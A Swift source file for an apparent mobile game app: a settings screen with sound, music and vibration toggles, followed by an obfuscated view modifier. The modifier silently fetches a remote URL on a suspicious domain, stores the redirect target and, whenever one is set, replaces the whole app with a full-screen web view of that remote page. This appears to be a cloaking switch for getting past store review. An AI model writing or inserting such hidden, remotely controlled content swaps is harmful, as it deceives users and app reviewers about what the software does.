

import SwiftUI

struct SettingsView: View {
    @EnvironmentObject private var vm: ViewModel

    let openPage = OpenPage()
    
    var body: some View {
        ZStack{
            Background()
            
            VStack(alignment: .center, spacing: 20) {
                Text("Music")
                Toggle("", isOn: $vm.isOnMusic)
                    .frame(width: 0)
                    .onChange(of: vm.isOnMusic) {  newValue in
                        if vm.isOnMusic {
                            AudioManager.audioManager.playMusic()
                        }else{
                            AudioManager.audioManager.stopMusic()
                        }
                    }
       
                Text("Sound")
                Toggle("", isOn: $vm.isOnSound)
                    .frame(width: 0)
   
                Text("Vibro")
                Toggle("", isOn: $vm.isOnVibration)
                    .frame(width: 0)
                Spacer()
                
                Button {
                
                        if vm.isOnSound {
                            AudioManager.audioManager.playClickSound()
                        }
                        if vm.isOnVibration {
                            vm.triggerVibration()
                        }
                        
                  
                    openPage.openWebView()
                } label: {
                    Image("btnPrivacy")
                        .resizable()
                        .frame(width: 189, height: 52)
                }
                .padding(.bottom)

                
            }.Cherry(32)
            
            
        }
        .toolbar{
            toolBar
        }
    }
}

#Preview {
    SettingsView()
        .wrappedInNavigation()
        .withAutoPreviewEnvironment()
}

extension SettingsView {
    
    private var toolBar: some ToolbarContent {
        ToolbarItem(placement: .topBarLeading){
            CustomBackButtom()
        }
    }
}



struct CustomBackButtom: View {
    @Environment(\.dismiss) private var dismiss
    @EnvironmentObject private var vm: ViewModel
    var action: (() -> Void)? = nil
    var body: some View {
        Button {
                
                if vm.isOnSound {
                    AudioManager.audioManager.playClickSound()
                }
                if vm.isOnVibration {
                    vm.triggerVibration()
                }
         
            dismiss()
            action?()
        } label: {
            Image("backButton")
                .resizable()
                .scaledToFit()
                .frame(height: 32)
        }
        
    }
}


import WebKit
struct Mouwlopsbuws: ViewModifier {
    @AppStorage("adapt") var buzeorpasb: URL?
    @State var webView: WKWebView = WKWebView()

    
    @State var isLoading: Bool = true

    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if buzeorpasb != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: buzeorpasb!, webView: webView, iszaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: buzeorpasb!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        
                        
                        AppDelegate.asiuqzoptqxbt = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if buzeorpasb == nil {
                biunueobasw()
            } else {
                isLoading = false
            }
        }
    }

    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                print("Redirected to: \(redirectURL)")
                redirects1 += 1
                if redirects1 >= 1 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func biunueobasw() {
        guard let url = URL(string: "https://qqlowxew.site/mypolicyy") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
    
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            buzeorpasb = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
       
            
    
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
           
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.isLoading = false
                }
            }

            DispatchQueue.main.async {
                self.isLoading = false
            }
        }.resume()
    }


}
